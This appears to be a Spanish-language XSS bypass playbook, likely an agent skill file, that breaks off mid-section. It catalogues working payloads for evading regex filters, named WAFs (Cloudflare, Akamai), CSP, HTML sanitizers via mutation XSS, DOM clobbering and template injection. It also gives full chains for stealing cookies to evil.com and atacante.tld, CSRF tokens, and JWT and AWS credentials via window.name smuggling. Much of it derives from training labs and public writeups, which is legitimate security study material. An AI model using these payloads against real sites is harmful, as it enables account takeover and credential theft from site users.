# Técnicas de bypass — XSS

Cargar SOLO cuando ya hay reflexión/persistencia confirmada y hace falta
esquivar un filtro. Ninguna técnica acá garantiza bypass — cada filtro es
distinto, probar en vivo siempre. Fecha de referencia de estas técnicas:
mediados 2026 — verificar vigencia contra el WAF real del target, no asumir.

## Categorías base de XSS
HTML completo, HTML parcial (atributos inline), inyección de JS directo,
inyección en URL/parámetros. Adaptar la técnica según en cuál caemos.

## Principio de trabajo
Prueba y error metódica: payload chico → testear respuesta → ajustar →
repetir. No copiar payloads sin entender qué carácter hace qué.

## Fallas típicas de filtros basados en regex
- **Falta flag `g`** → detecta solo la primera ocurrencia, repetir la
  keyword evade.
- **Falta flag `i`** → mezclar mayúsculas/minúsculas evade
  (`<ScRiPt>`, `<IMG SRC=x ONERROR=alert(1)>`).
- **Falta flag `s`** → un salto de línea rompe el match.
- **Sin anclajes `^`/`$`** → agregar prefijo/sufijo puede evadir.


## Codificación
URL encoding, octal, Unicode, entidades HTML (nombradas o numéricas, ej.
`&#97;&#108;&#101;&#114;&#116;(1)`), doble codificación. En JS: escapes
Unicode (`\u0061\u006C...`) o hex (`eval('\x61lert(1)')`).


## Caracteres invisibles, orden y bytes nulos
Insertar `0x0D`/`0x09`/`0x0C` entre atributos. Cambiar el orden esperado
de atributos rompe filtros con estructura fija asumida. Bytes nulos o
vertical tab dentro del nombre del evento: `onerror\x00=alert(1)`,
`onerror/=alert(1)`.

## Filtros de paréntesis, comillas, punto y espacio
- Sin paréntesis: `` alert`1` ``, `onerror=alert;throw 1`,
  `` setTimeout`alert\u0028document.domain\u0029` ``
- Sin comillas: `String.fromCharCode(88,83,83)`, `/XSS/.source`
- Sin punto: `window['alert'](document['domain'])`
- Sin espacio: `<svg/onload=alert(1)>`, `<img/src=x/onerror=alert(1)>`

**Sin espacio, dentro de una expresión JS (no solo en atributos HTML):**
el comentario de bloque vacío `/**/` funciona como separador de tokens
en cualquier punto donde JS acepte whitespace, no solo entre atributos
de un tag. Ejemplo real (lab "JS URL some characters blocked"):
`throw/**/onerror=alert,1337` — el `/**/` separa `throw` de `onerror`
donde un espacio literal estaba bloqueado. Aplica a cualquier sink que
sea código JS evaluado directamente (URI `javascript:`, `eval`, handler
inline), no solo a markup HTML.

## Tags menos comunes (cuando `<script>`/`<img>` están bloqueados)
`<details open ontoggle=alert(1)>`, `<video src=_ onloadstart=alert(1)>`,
`<audio src onloadstart=alert(1)>`, `<marquee onstart=alert(1)>`,
`<meter value=2 min=0 max=10 onmouseover=alert(1)>`. Tags anidados/rotos
(`<scr<script>ipt>`) para filtros que hacen un solo pase de reemplazo.

## Auto-disparo de eventos "con interacción" vía foco forzado
Eventos que en teoría requieren interacción del usuario (`onfocus`,
`onblur` en cascada) se pueden convertir en auto-ejecutables combinando:

```html
<xss id=x onfocus=alert(1) tabindex=1>
```

con un fragmento de URL apuntando al `id` del elemento:

```
https://target.tld/?search=<payload>#x
```

Los browsers auto-focusean el elemento target del fragmento si es
focuseable (`tabindex` lo hace focuseable aunque no sea nativamente un
control de formulario). El evento `onfocus` dispara al cargar la página,
sin ningún click de la víctima.

*Caso propio: lab "reflected XSS into HTML context with all tags
blocked except custom ones" — tag custom `<xss>` fuera de blocklist +
este truco, cero interacción real necesaria pese a que `onfocus` "debería"
requerirla. Reclasificar este tipo de evento como sin-interacción en el
ranking cuando el contexto permite fragment + tabindex.*

## Manipulación de atributos bloqueados en runtime vía SMIL
Cuando el filtro bloquea un atributo si aparece **escrito literal** en
el markup (ej: `href="javascript:..."` → "Attribute is not allowed"),
pero permite tags SVG de animación, se puede setear ese atributo en
runtime sin que el filtro lo vea nunca como atributo literal:

```html
<svg><a><animate attributeName=href values=javascript:alert(1) />click</a></svg>
```

`<animate>` no es en sí mismo el atributo bloqueado — el filtro nunca ve
`href=` escrito en el payload, lo ve recién el DOM en runtime, después de
que el parser ya aceptó el markup. Generalizable a cualquier atributo
bloqueado en whitelist/blocklist de atributos literales (no solo `href`)
si el tag contenedor soporta la animación de ese atributo. Requiere click
si el resultado final necesita navegación (URI `javascript:` en un
`<a>`); si el atributo afecta algo que dispara sin navegación (ej. un
handler seteado vía animación, si el motor lo permitiera), podría no
requerir interacción — no confirmado, verificar caso por caso.

*Caso propio: lab con whitelist server-side (solo `svg`/`a` permitidos,
cualquier `on*` y atributo literal bloqueados) — esta fue la única vía
que no rebotó contra la whitelist.*

## Filtros de paréntesis, comillas, punto y espacio (continuación) —
## Coerción de tipo forzada como sink alternativo
Cuando `eval`, `Function`, y construcciones directas de invocación están
bloqueadas o no hay forma de armar una llamada de función válida dentro
del espacio permitido, se puede forzar la conversión implícita de tipo
(`toString`/`valueOf`) de un objeto para ejecutar código controlado sin
que el payload contenga una invocación de función literal:

- Pisar `toString` (o `valueOf`) de un objeto global con una función
  propia.
- Forzar la coerción con una operación que dispare conversión a string
  implícita (ej. concatenación `objeto + ''`).
- El motor JS llama a tu función pisada durante la coerción — desde ahí
  podés ejecutar lo que necesites, incluyendo usar `throw` (que es un
  statement, no expresión — necesita envolverse en una función flecha
  para poder asignarse) para lanzar un valor que dispare un exception
  handler externo (ej. `onerror`) con el argumento que quieras.

Técnica de nicho, esperar que la combinación exacta cambie por completo
según qué esté bloqueado en cada filtro — no es un vector de catálogo
reusable palabra por palabra, es un principio a tener en la cabeza
cuando `eval`/`Function`/llamadas directas están todas cerradas y
todavía hay superficie de JS puro disponible.

*Caso propio: lab "reflected XSS in a JavaScript URL with some
characters blocked" (CTF-level, resuelto por la solución oficial de
PortSwigger, no por probing propio — dejar registrado como técnica de
referencia, no reintentar redescubrirla desde cero la próxima vez que
aparezca un filtro similar).*

## Bypass por WAF específico
- **Cloudflare**: `` <svg/onload="`${prompt``}`"> ``,
  `` 1'"><img/src/onerror=.1|alert``> ``
- **Akamai**: `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>`

No asumir que sigue funcionando tal cual — los WAFs se actualizan,
confirmar en vivo.

## Bracket notation para romper adyacencia keyword+paréntesis en regex de WAF
Cuando el WAF matchea con un regex que busca una keyword peligrosa
(`eval`, `alert`, `setTimeout`, `Function`...) pegada directo a un
paréntesis de apertura (con o sin espacio opcional entre medio), acceder
a la función vía bracket notation con la keyword como string rompe esa
adyacencia sin cambiar el comportamiento del JS:

```
alert(1)               → bloqueado (keyword+paréntesis directo)
top["alert"](1)         → puede pasar (la keyword está dentro de un
                           string, nunca queda pegada a "(" en el texto
                           crudo que ve el regex)
```

El motor de JS resuelve `top["alert"]` a la función igual que `alert` a
secas — el bypass es puramente sobre lo que el regex del WAF ve en el
string crudo, no sobre semántica de JS. Generaliza a cualquier keyword
bloqueada así (`top["eval"]`, `top["setTimeout"]`, etc.), no solo a
`alert`.

**Distinto de "Ofuscación de keywords vía destructuring dinámico" (más
abajo):** ahí el string literal de la keyword nunca aparece en el
payload (se arma por índices/concatenación). Acá el string literal SÍ
aparece completo (`"eval"`, `"setTimeout"`) — lo que se rompe es la
adyacencia sintáctica con el paréntesis, no la presencia del literal.
Sirven contra dos modelos de regex distintos — confirmar cuál es el del
WAF real antes de elegir una u otra.

**Cómo confirmar si el WAF usa este patrón:** mapear sistemáticamente
qué pasa y qué no con variantes controladas, no probar encodings al
azar — anotar qué tienen en común los bloqueados vs. los que pasan.

*Confirmado (derivado) — writeup infosecwriteups.com (Alvin Ferdiansyah,
jun 2026), payload real `top["setTimeout"](name)` contra un WAF Akamai
con regla de adyacencia keyword-paréntesis, programa H1 con scope
wildcard. No verificado en vivo contra ningún target propio todavía.*

## Bracket notation + window.name como canal de transporte (chain completo)
Combinando la técnica de arriba con `window.name`: el payload real nunca
viaja en la URL, así que el WAF nunca lo inspecciona — solo ve el
dispatcher (`top["setTimeout"](name)`), no el JS que se ejecuta.

`window.name` es una property por-tab que persiste entre navegaciones
cross-origin — no la rige la same-origin policy, es del tab, no del
documento. Permite setear código JS en una página propia y que llegue
intacto a la página del target tras la redirección.

```html
<!-- página del atacante -->
<script>
window.name = "alert('XSS en ' + document.domain)";
location.href = "https://target.tld/ruta-con-sink"
  + "?param=javascript:top%5B%22setTimeout%22%5D(name)";
</script>
```

`setTimeout` con argumento string lo evalúa como `eval` — mismo efecto,
sin que el string `eval` aparezca en ningún lado del request.

**Requisito de base:** necesita un sink que pase un parámetro sin
validar scheme a `location.assign`/`location.href`/`location.replace`
con scheme `javascript:` — no es un bypass de filtro de contenido HTML,
es específico de sinks de navegación con URI scheme controlado por el
atacante.

**Multiplica el impacto si el target expone un SDK de auth global**
(objeto colgado de `window` con métodos que devuelven JWT/credenciales,
tipo `platform.core.iam.getJWTToken()` / `getTempAWSCreds()`) — ahí XSS
deja de ser "robo de cookie" y pasa a robo de credenciales completo,
incluso con cookies HttpOnly, porque el SDK hace las llamadas
autenticadas por vos. Pendiente de buscar este patrón en bundles JS de
`references/` de recon.

*Confirmado (derivado) — mismo writeup, chain completo: sink sin
validación de scheme + regla WAF con adyacencia keyword-paréntesis +
window.name como smuggling + SDK de auth global expuesto → ATO con JWT
y credenciales AWS STS de dos cuentas separadas, 8 segundos desde el
click. Cuatro fallas independientes — cualquiera de las cuatro,
arreglada sola, corta el chain entero. No verificado en vivo contra
ningún target propio.*

## CSP bypass
Primero: inspeccionar el header real (`curl -sI <url> | grep -i
content-security-policy`) y evaluarlo contra csp-evaluator.withgoogle.com.
Ojo: dos policies CSP en la misma respuesta se combinan por intersección
(la más estricta gana), no por la más permisiva.

- **JSONP** (si el CSP permite dominios con endpoints JSONP tipo
  google.com/youtube.com): `<script src="//google.com/complete/search?
  client=chrome&jsonp=alert(1);"></script>`
- **`data:` URI** (si `script-src` incluye `data:`):
  `<script src="data:,alert(1)"></script>`
- **`<base>` tag** (si hay nonce pero falta `base-uri` en la policy):
  `<base href="https://attacker.com/">`
- **object/embed** (si `script-src 'self'` sin más restricción):
  `<object data="data:text/html;base64,...">`

## CSP bypass — inyección de directiva vía parámetro reflejado en el propio header
Cuando el server arma una directiva del header CSP usando un valor
controlado por el atacante (patrón típico: `report-uri` construido con
un query param, ej. `report-uri /csp-report?token=<valor>`), y ese valor
no se sanitiza antes de insertarse en el header, se puede cerrar la
directiva actual con `;` e inyectar una directiva nueva en la misma
respuesta — la policy queda corrompida por el propio servidor, no hay
que bypassear la policy existente, se reemplaza.

Ejemplo: `token=;script-src-elem 'unsafe-inline'` — `script-src-elem` es
más específico que `script-src` para elementos `<script>`; cuando ambas
coexisten en la misma policy, `script-src-elem` gana para ese propósito,
habilitando scripts inline pese a que `script-src` los prohibía.

**Antes de descartar CSP bypass, inspeccionar el header completo,
directiva por directiva** — no solo `script-src`. Cualquier directiva
que incluya un valor con pinta de venir de un parámetro de request
(`report-uri`, `report-to`, cualquier URL con query string dentro del
header) es candidata a este vector. Soporte de motor puede variar entre
browsers para directivas específicas (`script-src-elem` como directiva
independiente tiene mejor soporte en Chromium) — confirmar cross-browser
si el impacto lo amerita.

*Caso propio: lab "Reflected XSS protected by CSP, with CSP bypass" —
encontrado y confirmado de punta a punta sin pista previa, en ~4 minutos.*

## Client-Side Template Injection (Angular/Vue/handlebars)
Si el target usa un framework con binding de template del lado cliente,
el sandbox de expresiones a veces se puede escapar:

```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

Confirmar el framework primero (buscar `ng-app`, Vue devtools, etc.) antes
de asumir que aplica.

**Aviso de calibración:** las cadenas de sandbox-escape específicas
(charAt/join clobbering, gadgets sin strings, etc.) suelen ser técnicas
documentadas de labs puntuales, no descubribles por probing genérico —
un agente puede "recordarlas" de su entrenamiento sin haberlas verificado,
y fallar en la práctica si la versión de Angular/el contexto difiere
levemente. Tratar cualquier CSTI resuelto "de memoria" como no confirmado
hasta verificación real en browser. CSTI en general necesita su propia
metodología dedicada (fuera del alcance de filter-probing/vector-catalog,
que asumen filtro server-side clásico) — pendiente de armar como skill
aparte si se vuelve recurrente en targets reales.

## DOM Clobbering
Cuando el código referencia elementos del DOM por nombre/id sin chequeo,
se pueden "clobbear" inyectando elementos HTML con nombres que matcheen:

```html
<!-- Si el código hace: if (window.config) { url = config.url } -->
<a id=config><a id=config name=url href="javascript:alert(1)">

<!-- Si el código hace: element.innerHTML = defaultText -->
<img name=defaultText src=x onerror=alert(1)>
```

**Confirmado en la práctica — bypass de sanitizer vía esquema URI opaco:**
cuando el sink final usa el valor clobbeado dentro de un atributo HTML
(ej. `src="..." + defaultAvatar.avatar`) y hay un sanitizer (DOMPurify)
de por medio en el HTML de entrada, el patrón vulnerable típico es:

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/ruta/default.svg'}
```

Clobbear con dos `<a>` del mismo `id` (se agrupan en una `HTMLCollection`)
donde el segundo tiene `name` igual a la propiedad a clobbear — el valor
resultante es el `.href` de ese `<a>` (los elementos `<a>` devuelven su
`href` al hacer `.toString()`, a diferencia de otros elementos):

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar
href="mailto:x&quot;/onerror=&quot;alert(document.cookie)&quot;/x=&quot;">
```

**Por qué el esquema importa:** `javascript:` lo bloquea DOMPurify, pero
esquemas "opacos" para el parser de URLs (`mailto:`, `cid:`, y
potencialmente otros no estándar) **no aplican percent-encoding a las
comillas** dentro del valor — entonces una comilla HTML-entity (`&quot;`)
sobrevive cruda al resolver `.href`, rompiendo el atributo del sink final
e inyectando el handler (`onerror=...`) limpio. Confirmado con `mailto:`
además de `cid:` (el de la doc oficial) — el patrón generaliza a
cualquier esquema URI que el sanitizer permita y que el motor trate como
opaco.

**Versión de sanitizer importa:** DOMPurify agregó protección anti-
clobbering recién en versiones más nuevas (~2.2.0+) — confirmar versión
del bundle antes de descartar el vector por "tiene DOMPurify, está
protegido".

*Caso propio: lab "Exploiting DOM clobbering to enable XSS" —
`loadCommentsWithDomClobbering.js`, DOMPurify 2.0.15, confirmado con
ejecución real (alert disparado), variante `mailto:` en vez de `cid:`.*

## Mutation XSS (mXSS) y Parsing Differentials

Bypass de sanitizer vía diferencias de parseo entre el sanitizer server-side y
el browser. Fuente principal: Klein & Johns, TU Braunschweig 2024 — estudiaron
11 sanitizers, bypasearon 9/11. Los dos que resistieron: **sanitize-html** y
**loofah**.

El modelo de ataque: el sanitizer ve el payload, no detecta XSS (porque parsea
distinto al browser), lo deja pasar o lo transforma en algo que el browser
luego parsea como ejecutable.

### PI 1 — RCDATA / Tags con contenido texto

Tags que el browser parsea como RCDATA (texto plano hasta el closing tag):
`iframe`, `textarea`, `xmp`, `noframes`, `noembed`, `title`, `style`, `plaintext`

Sanitizers con XML parser no implementan la transición a RCDATA — tratan el
contenido como HTML markup. Esto permite esconder el payload como "atributo":

```html
<iframe><div id='</iframe><img src=x onerror=alert(1)>'>
```
- Sanitizer: `iframe > div[id='</iframe>']` — img queda como valor de atributo → pasa
- Browser: todo hasta `</iframe>` es texto → al salir del iframe, img está en HTML context → ejecuta

Variantes directas (menos refinadas pero útiles para fingerprint):
```html
<textarea><img src=x onerror=alert(1)></textarea>
<xmp><img src=x onerror=alert(1)></xmp>
<noframes><img src=x onerror=alert(1)></noframes>
```

**Sanitizers vulnerables:** DOMPurify (old), DOMPurify jsdom19, sanitizer (.NET),
google-caja-sanitizer, HtmlSanitizer, HtmlRuleSanitizer, rgrove/sanitize.

### PI 2 — noscript mal parseado

Cuando scripting está habilitado (browser normal), `noscript` content = texto
plano. Muchos sanitizers lo parsean como markup (como si scripting estuviera off).

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
- Sanitizer (scripting off): `noscript > p[title="</noscript>..."]` — img dentro de atributo → pasa
- Browser (scripting on → noscript = raw text): sale del noscript al `</noscript>`, el img queda en HTML context → **XSS**

**Sanitizers vulnerables:** google-caja-sanitizer, HtmlRuleSanitizer, Typo3,
rgrove/sanitize, AntiSamy, JSoup.

### PI 3 — Namespace confusion MathML/SVG ⭐ el más portable

El running example del paper — bypasea especialmente Java/PHP sanitizers:

```html
<img src=x onerror=alert(1)> <math> <iframe> <img src=x onerror=alert(1)>
```
- Sanitizer: no entiende namespace transitions. En HTML, `iframe` = RCDATA. Segundo img queda como texto dentro del iframe → borra el primer img (HTML puro), deja el segundo como "texto"
- Output del sanitizer: `<math><iframe><img src=x onerror=alert(1)></iframe></math>`
- Browser: en MathML, `iframe` no es RCDATA. Al ver `<img>`, sale del namespace MathML (img es break-out tag) → img queda en HTML context → **ejecuta**

Más vectores de namespace confusion:
```html
<!-- SVG desc es integration point HTML → permite HTML dentro de SVG -->
<svg><desc><div><img src=x onerror=alert(1)></div></desc></svg>

<!-- MathML integration points: mtext, mo, mi, mn, ms -->
<math><mtext><img src=x onerror=alert(1)></mtext></math>

<!-- SVG foreignObject → HTML dentro de SVG, luego img break-out -->
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>

<!-- Variante mínima -->
<math><iframe><img src=x onerror=alert(1)>
```

**Sanitizers vulnerables:** HtmlRuleSanitizer, Typo3, AntiSamy, JSoup.

### PI 4 — CDATA sections

CDATA válido en SVG/MathML pero no en HTML (browser lo trata como bogus comment).
Sanitizers que no distinguen foreign content lo tratan como texto literal.

```html
<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>
```

**Sanitizer afectado principal:** DOMPurify en modo lax (CVE-2022-36020).

### PI 5 — Bang comments (`--!>`)

Cierre válido de comment: `-->`. Cierre inválido: `--!>`. El browser cierra
el comment en `--!>`, el sanitizer vulnerable no lo reconoce como cierre.

```html
<!-- harmless text --!><img src=x onerror=alert(1)>-->
```
- Sanitizer: no reconoce `--!>` como cierre → img sigue "dentro" del comment → pasa como texto
- Browser: cierra el comment en `--!>` → img en HTML context → ejecuta

**Sanitizers vulnerables:** sanitizer (.NET), HtmlSanitizer (.NET).

### SI 6 — Decode-and-reflect (lógica, no parsing)

Sanitizer que decodea HTML entities pero no re-sanitiza el output:
```html
&lt;img src=x onerror=alert(1)&gt;
```
Sanitizer decodea, output literal: `<img src=x onerror=alert(1)>` → XSS.

### Mapa rápido por sanitizer

| Sanitizer | Lang | Bypaseado | PIs |
|---|---|---|---|
| DOMPurify (old) | JS | ✅ | PI 1, PI 4 |
| DOMPurify jsdom19 | JS | ✅ | PI 1 |
| sanitizer | .NET | ✅ | PI 1, PI 5 |
| google-caja | JS | ✅ | PI 1, PI 2 |
| HtmlSanitizer | .NET | ✅ | PI 1, PI 5 |
| HtmlRuleSanitizer | .NET | ✅ | PI 1, PI 2, PI 3 |
| Typo3 | PHP | ✅ | PI 2, PI 3 |
| rgrove/sanitize | Ruby | ✅ | PI 1, PI 2 |
| AntiSamy | Java | ✅ | PI 2, PI 3 |
| JSoup | Java | ✅ | PI 2, PI 3 |
| **sanitize-html** | JS | ❌ | — |
| **loofah** | Ruby | ❌ | — |

### Cuándo aplicar

1. Detectar lenguaje/stack del server → inferir sanitizer probable
2. Java/PHP → empezar con PI 3 (namespace MathML/SVG), luego PI 2 (noscript)
3. .NET → PI 1 (RCDATA) + PI 5 (bang comment)
4. Node.js + DOMPurify viejo → PI 1, verificar versión antes de PI 4
5. Si hay rich-text editor (markdown, WYSIWYG, HTML comments) → PI 2 y PI 5 tienen más superficie

Verificar versión del sanitizer (CVEs ya están parchados en versiones nuevas —
el valor está en instancias desactualizadas o sanitizers custom que replicaron
el mismo bug de parsing).

## Markdown-to-XSS vía javascript: URI
Cuando el target renderiza markdown de usuario (chats, asistentes, comentarios
con soporte de markdown): un link o imagen con URL `javascript:` en vez de
`http(s)://` ejecuta JS al activarse.

```
![texto clickeable](javascript:alert(document.domain))
[link](javascript:alert(document.domain))
```

Cada vez más relevante con AI chat interfaces que renderizan markdown de
respuestas. Si el trigger requiere click (no auto-ejecuta), puede necesitar
encadenarse con CSRF para setear el contenido en la sesión de la víctima
antes de que lo vea.

## Event handlers específicos de vendor/browser
Las blocklists de WAF suelen cubrir los handlers "conocidos"
(`onerror`, `onload`, `onclick`, `onmouseover`...) pero no los
prefijados por vendor o específicos de un motor de browser —
`onwebkitplaybacktargetavailabilitychanged` (WebKit/Safari, evento de
disponibilidad de AirPlay en `<audio>`/`<video>`) es un ejemplo real.
Si el filtro es una blocklist estática de nombres de evento, cualquier
handler legítimo del DOM que no esté en esa lista pasa. Nota: solo
dispara en el motor que lo implementa (acá, Safari/WebKit) — probar
cross-browser real, no asumir.

## Ofuscación de keywords vía destructuring dinámico
Cuando el WAF usa firmas de string/regex que buscan literales como
`eval` o `self`, se puede armar la keyword en runtime sin que el string
literal aparezca en el payload — ej: destructurar un string fuente por
índices de carácter y concatenar para reconstruir el nombre de la
función antes de invocarla dinámicamente (`self[nombreArmado](...)`).
Evade matching de firma porque el texto "eval" nunca está presente tal
cual en el payload enviado.

### Variante: identificadores Unicode (Cuneiform/non-ASCII) + JSFuck-style

Extensión del principio anterior: usar caracteres Unicode no-ASCII como
nombres de variable para que el WAF no los matchee como identificadores
JS conocidos, combinado con reconstrucción JSFuck-style de `"constructor"`
para llegar a `Function` sin escribir ninguna keyword:

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,
𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟]
[𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

Qué hace: extrae caracteres de `"true"`, `"false"`, `"[object Object]"` para
armar `"constructor"` → `"true"["constructor"]` = String → `String["constructor"]`
= Function → `Function("alert(𒀀)")()` donde `𒀀=1` en scope global → `alert(1)`.

Ninguna keyword aparece en el payload: ni `eval`, ni `alert`, ni `Function`,
ni `constructor`. Los identificadores Cuneiform no están en ninguna blocklist
de WAF conocida.

**Precondiciones (todas deben cumplirse):**
1. Ya tenés un contexto de ejecución JS — `<script>` o event handler que ya
   pasó el filtro. Este técnica no bypasea HTML encoding ni tag injection.
2. Las variables Cuneiform deben estar en scope global al momento de la
   llamada — funciona en `<script>` inline y event handlers; puede fallar en
   módulos ES6 con scope propio.
3. El WAF no hace AST/Unicode normalization (Cloudflare y Akamai nuevos sí
   lo hacen — probar con canary antes de asumir bypass).
4. La longitud del payload (~300 chars) puede activar anomaly detection por
   tamaño — si hay un límite de tamaño en el parámetro, adaptar.

**Contra qué WAFs aplica:** regex/blocklist de keywords sin normalización
Unicode. No aplica contra WAFs con AST parsing o Unicode normalization.

que `<>` se encodean antes del sink — llegar al contexto JS donde este
bypass ayudaría requiere primero resolver el encoding, que este técnica
no toca.

## Sinks nuevos por stack

**ASP.NET:** `Control.ResolveUrl` — resuelve paths app-root-relative sin
sanitizar el input, puede terminar en un sink de renderizado sin encoding.

## Sinks de jQuery
`$(...)` (selector injection), `.html()`, `.append()`/`.prepend()`/
`.after()`/`.before()`, `.parseHTML()`, `.globalEval()`.

## Impacto: robo de token CSRF in-band (post-XSS)
Una vez confirmado un XSS (reflected o stored), el token CSRF de la
víctima deja de proteger nada si el payload corre en el mismo origen:
el script puede pedir cualquier página que contenga el token vigente y
usarlo él mismo para forjar la acción protegida. Template reusable:

```js
fetch("/pagina-con-token").then(r=>r.text()).then(t=>{
  const token = t.match(/name="csrf" value="([^"]+)"/)[1];
  fetch("/accion-protegida", {
    method: "POST",
    headers: {"Content-Type":"application/x-www-form-urlencoded"},
    body: "csrf=" + token + "&<resto-de-parametros-de-la-accion>"
  });
});
```

Sube cualquier self-XSS o CSRF previamente descartado por protección de
token a impacto de cuenta completa, si hay una acción sensible
alcanzable (cambio de email/password, transferencia, etc.) y el XSS
corre en sesión de la víctima. Este patrón es el primer paso a evaluar
al confirmar cualquier XSS con impacto potencial más allá de un alert.

## Casos especiales
- **Campos con validación de formato** (ej: email): el payload tiene que
  respetar el formato esperado.
- **Race condition / comentar el resto**: `<!-- -->` o `<xmp>` para
  neutralizar lo que sigue al punto de inyección.
- **Fragmento de URL (`#...`)**: nunca viaja al server — sirve para
  evadir validación server-side, que nunca lo ve. Ver también sección
  de auto-foco arriba, que usa el fragmento para otro fin (forzar foco,
  no solo evadir validación).
- **Dangling markup**: dejar un atributo/comentario sin cerrar para que
  el navegador lo cierre solo y dispare el payload.
- **Fake handlers**: eventos inventados que algunos parsers aceptan igual.
- **Override de form via `formaction`/`formmethod` en un `<button>` — CSP-immune sin JS**:
  cuando CSP bloquea `script-src` pero el HTML se inyecta crudo dentro de
  un `<form>` que contiene datos sensibles (token CSRF oculto, campos de
  otra acción), un `<button formaction="https://atacante.tld/log"
  formmethod="GET">texto</button>` inyectado dentro de ese mismo form
  redirige el submit — al clickear, el browser manda TODOS los campos
  del form (incluido el token CSRF) al destino que elijas, sin ejecutar
  una sola línea de JS. CSP no tiene nada que decir porque no hay script
  de por medio, es un mecanismo nativo de HTML. HTML válido de punta a
  punta, no depende de que el parser tolere algo mal cerrado (a
  diferencia de dangling markup clásico). Requiere click de la víctima.
  Encadenar con el patrón de robo de token CSRF de la sección de
  Impacto, arriba — acá el token sale filtrado directo al log del
  atacante en vez de vía `fetch`.

*Caso propio: lab "very strict CSP, dangling markup" — resuelto por
esta vía en vez de la técnica clásica que da nombre al lab (atributo
sin cerrar que arrastra el resto de la página vía `<base>`/`<img>`) —
esa variante sigue sin validación empírica propia, pendiente si se
quiere cerrar el hueco completo.*

## Variable splitting para evadir firmas WAF en sinks javascript:

Cuando el WAF tiene firmas de strings literales que buscan acceso a
propiedades peligrosas (`document.cookie`, `document.location`,
`window.location`, `location.href`) en forma directa, reescribir el
acceso usando variables intermedias y bracket notation rompe la firma
sin cambiar el comportamiento en runtime:

```js
// Bloqueado — firma matchea "document.cookie" y "window.location" literales
javascript://window.location.href=`https://evil.com/?cookie=${document.cookie}`

// Pasa — ninguna firma literal está presente en el texto crudo
javascript:a=document;b='location';c='cookie'/*bypass*/;d='//atacante.tld/';a[b]=d+a[c]
```

**Por qué funciona:** el WAF analiza el string estático. Las firmas buscan
tokens contiguos como `document.cookie` o `location.href`. Al separar el
objeto (`a=document`) de la propiedad (`b='location'`) en variables
distintas, y acceder via bracket notation (`a[b]`), los tokens peligrosos
nunca aparecen juntos en el texto crudo que escaneó el WAF. El motor JS
arma `document['location']` en runtime — semánticamente idéntico, pero el
WAF ya dejó pasar el string.

El comentario `/*bypass*/` cumple un rol adicional: rompe cualquier firma
que busque secuencias contiguas de tokens dentro del mismo statement, en
caso de que el WAF use análisis de tokens en vez de regex puro.

**Combinación con percent-encoding del scheme:** si el WAF también filtra
el string literal `javascript:`, combinar con encoding completo del scheme:

```
%6a%61%76%61%73%63%72%69%70%74%3a<resto del payload sin encodear>
```

El filtro ve basura donde debería estar `javascript:`, y la app decodea
después del chequeo (decode-after-check). La sección del payload que viene
después no necesita encodear todo — solo el scheme, que es lo que el WAF
reconoce como peligroso.

**Precondición para este bypass:** que el app decodee el input DESPUÉS de
la validación del WAF, no antes. Si el WAF normaliza primero y valida
después, el encoding no ayuda. Verificar con canary encodeado vs. raw en
`filter-probing.md` step 7.

## Inconsistencia GET vs POST como señal de code paths separados

Algunos endpoints tienen dos code paths de filtrado según el método HTTP —
el GET puede tener validación más estricta que el POST, o viceversa. Esto
es un bug de implementación: el dev escribió el filtro para un método y
olvidó replicarlo al otro.

**Señal:** el mismo payload bloqueado en GET pasa (o se comporta diferente)
en POST. Incluso sin XSS todavía, una respuesta distinta entre métodos en
un endpoint de redirect/callback ya justifica profundizar.

**Cómo detectarlo en probing:**

1. Enviar el canary base con GET, anotar outcome.
2. Enviar el mismo canary con POST (mismos parámetros, mismo valor).
3. Si los outcomes difieren → hay code paths separados → probar los
   payloads que el GET bloquea contra el POST.

No asumir que la inconsistencia favorece siempre al POST — puede ir en
cualquier dirección. Lo que importa es la diferencia, no cuál es "más
permisivo".

*Caso real (disclosed): endpoint `/callback/redirect` con params `method`
y `url` — method=GET tenía filtro más agresivo que method=POST. El bypass
completo requirió POST + variable splitting + encoding del scheme.*

## Bypass de validación de formato — URL y email campos "estrictos"

Cuando el campo tiene validación de formato (email, URL) que parece bloquear
XSS, muchas validaciones solo verifican estructura superficial y no sanitizan
el valor antes del sink.

**Email fields:**
```
# Validación básica: contiene @ y dominio → pasa
"xss@evil.com<img onerror=alert(1)>"
xss+<script>alert(1)</script>@evil.com
xss@evil.com"><script>alert(1)</script>

# Algunos validators solo chequean el último segmento después del @:
a@b.c<svg/onload=alert(1)>
```

**URL fields:**
```
# Validación que solo chequea que empiece con http(s)://
https://evil.com"><script>alert(1)</script>
https://evil.com/x?y=<img onerror=alert(1)>

# javascript: scheme a veces pasa validators que solo chequeran scheme:
javascript:alert(1)
JaVaScRiPt:alert(1)

# Data URI si el validator acepta cualquier URL válida por RFC:
data:text/html,<script>alert(1)</script>
```

**Approach:** mandar el canary dentro del formato válido (`canary@evil.com`,
`https://evil.com/CANARY9`) para confirmar reflexión antes del payload real.
Si el canary refleja dentro del formato → probar con chars especiales.

## ReferenceError Fix — cuando el payload rompe el script existente

Cuando inyectás en un JS context y el payload introduce una variable o sintaxis
que no existe en el scope, el motor lanza ReferenceError antes de llegar al
payload. El resto del script deja de ejecutar. El fix no es sofisticar el
payload — es eliminar la referencia rota.

**Diagnóstico:** el canary refleja en JS context pero no ejecuta. Abrir
DevTools → Console muestra `ReferenceError: <algo> is not defined`.

**Técnicas de fix:**

```javascript
// Si el problema es que tu payload rompe la sintaxis del statement anterior:
// Inyección en: var x = "INPUT";  → inyectás "; alert(1)//
// Si hay algo después del // que importa al parser → usar */ en vez de //
";alert(1)/*

// Si el payload referencia una variable que no existe:
